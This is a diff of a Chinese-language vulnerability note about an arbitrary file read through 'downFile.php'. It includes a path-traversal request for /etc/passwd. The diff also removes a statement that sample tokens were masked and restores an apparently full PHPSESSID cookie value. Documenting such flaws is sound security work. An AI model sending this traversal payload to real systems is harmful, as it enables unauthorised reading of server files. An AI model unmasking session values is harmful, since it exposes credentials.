@@ -37,7 +37,6 @@ source_status: "recorded"
 - 与V8控制台downfile名称相似但产品/路径/大小写不同，不能合并
 - 无响应与鉴权角色说明，任意读取范围待证
 - 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -66,7 +65,7 @@ source_status: "recorded"
 ```http
 GET /downFile.php?filename=../../../../etc/passwd HTTP/1.1
 Host: 
-Cookie: PHPSESSID=74h********************eq3
+Cookie: PHPSESSID=74hpcfh7p42bll8eabp1v88eq3
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
